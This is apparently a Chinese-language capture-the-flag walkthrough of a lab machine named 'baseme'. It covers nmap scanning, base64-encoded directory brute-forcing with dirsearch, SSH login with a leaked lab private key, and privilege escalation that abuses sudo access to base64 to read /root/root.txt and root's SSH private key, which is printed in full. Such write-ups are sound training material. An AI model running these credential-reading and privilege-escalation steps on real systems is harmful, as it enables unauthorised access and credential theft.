### 主机探测

```
arp-scan -l
```

> 靶机IP：192.168.56.112

端口探测

```shell
nmap -A 192.168.56.112
```

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)
|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)
|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:5F:CE:90 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 访问web页面

```html
QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK

<!--
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
-->

```

base64解码

```
ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
```

全部答案都在base64中

### 目录扫描

普通扫描找不到任何东西

猜测，将字典进行base64编码后进行尝试

> 首先找到一个爆破目录的字典
>
> 对每一行进行加密

```bash
while IFS= read -r $line
do
	echo $line | base64 >>$2
done < $1
```

```
bash 1.sh 1.txt dir.txt
```

得到的dir.txt就是base64编码后的字典

```shell
dirsearch -w dir.txt -u http://192.168.56.112
```

```shell
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 1083

Output File: /home/kali/baseme/reports/http_192.168.56.112/_24-03-14_08-12-20.txt

Target: http://192.168.56.112/

[08:12:20] Starting: 
[08:12:21] 200 -   25B  - /cm9ib3RzLnR4dAo=
[08:12:27] 200 -    2KB - /aWRfcnNhCg==

Task Completed
```

> id_rsa
>
> robots.txt

id_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
```

robots.txt

> Nothing here :(

### ssh连接

得到私钥，ssh连接

```shell
ssh lucas@192.168.56.112 -i id_rsa
```

> ```
> ssh lucas@192.168.56.112 -i id.rsa                                                                                                                                    
> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                                                               
> @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @                                                                                                               
> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                                                               
> Permissions 0644 for 'id.rsa' are too open.                                                                                                                               
> It is required that your private key files are NOT accessible by others.
> ```

如果出现这种情况，就给密钥700权限

```
chmod 700 id_rsa
```

```shell
Enter passphrase for key 'id_rsa': 
Linux baseme 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 14 02:22:58 2024 from 192.168.56.101
```

给的注释还没用，base64编码后

```
aWxvdmV5b3UK
eW91bG92ZXlvdQo=
c2hlbG92ZXN5b3U=
aGVsb3Zlc3lvdQo=
d2Vsb3ZleW91Cg==
dGhleWhhdGVzbWU=
```

密码是`aWxvdmV5b3UK`

### 提权

```
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/base64
```

可以使用base64

那就使用base64读取文件

![image-20240314203047916](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240314203047916.png)

```
sudo base64 /root/root.txt | base64 --decode
```

```
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                               
HMVFKBS64
```

或者读取id_rsa文件

```
lucas@baseme:~$ sudo base64 /root/.ssh/id_rsa | base64 --decode
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B
IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp
DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk
/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7
px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a
S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ
7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx
YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v
zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO
4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig
yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6
oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5
SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr
nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R
iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq
vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG
ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz
X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR
fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD
SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe
FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5
rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR
txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an
2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=
-----END OPENSSH PRIVATE KEY-----
```

### 总结

> 不是很难，思路很新奇，就是一样的步骤，只不过进行了base64编码
>
> 靶机涉及知识点：
>
> ssh私钥连接，目录爆破